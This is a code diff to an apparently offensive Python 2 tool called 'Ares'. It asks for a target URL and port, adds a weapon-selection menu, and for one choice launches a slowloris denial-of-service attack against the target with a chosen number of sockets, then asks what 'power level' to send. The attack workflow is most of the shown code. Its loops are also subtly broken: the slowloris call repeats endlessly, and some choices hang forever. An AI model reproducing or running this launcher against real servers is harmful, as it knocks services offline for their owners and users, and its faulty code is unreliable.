@@ -10,7 +10,10 @@ import threading
 import subprocess
 from colored import fg, bg, attr
 from logos import random_logos
+from backpack import portinfo, attacks
 import power_menu
+p = "-p"
+s = "-s"
 clear = lambda : os.system('tput reset')
 clear()
 
@@ -22,7 +25,6 @@ random_logos()
 print ("%sAres has been awoken %s" % (fg(82), attr(0)))
 target = raw_input("%sTarget: http://%s" % (fg(59), attr(0)))
 print "%sAres is locked on to:%s" % (fg(82), attr(0)), target
-portinfo = ["21:FTP", "22:SSH", "23:Telnet", "25:SMTP", "53:DNS", "67/68:DHCP", "69:TFTP", "80/8080:HTTP", "110:POP", "123:NTP", "137/138/139:NetBIOS","143:IMAP", "161/162:SNMP", "179:BGP", "389:LDAP", "443:HTTPS", "636:LDAPS", "989/990:FTPS"]
 time.sleep(2)
 clear()
 while True:
@@ -42,6 +44,33 @@ while True:
 print "%sAres is locked on to port:%s" % (fg(82), attr(0)), port
 time.sleep(2)
 clear()
+
+while True:
+    try:
+        print "Type 'help' for weapons or look at the WEAPONS file"
+        weapon = int(input("%sPick you weapon: %s" % (fg(59), attr(0))))
+    except TypeError:
+        print '\n'.join(map(str, attacks))
+    except NameError:
+        print "Type 'help' for weapons"
+    except SyntaxError:
+        print "Type 'help' for weapons"
+        continue
+    else:
+        break
+
+while True:
+    if weapon == 2:
+        port = str(port)
+        sockets = raw_input("how many sockets: ")
+        subprocess.call(["python", "slowloris.py", target, p, port, s, sockets ])
+    else:
+        break
+while True:
+    if weapon == 1:
+        break
+
+
 print "Type 'low' 'medium' 'high' or custum input. look at the 'MENU' file before choosing "
 power_menu.data = raw_input("%sWhat power level would you like to send to the server: %s" % (fg(59), attr(0)))
 
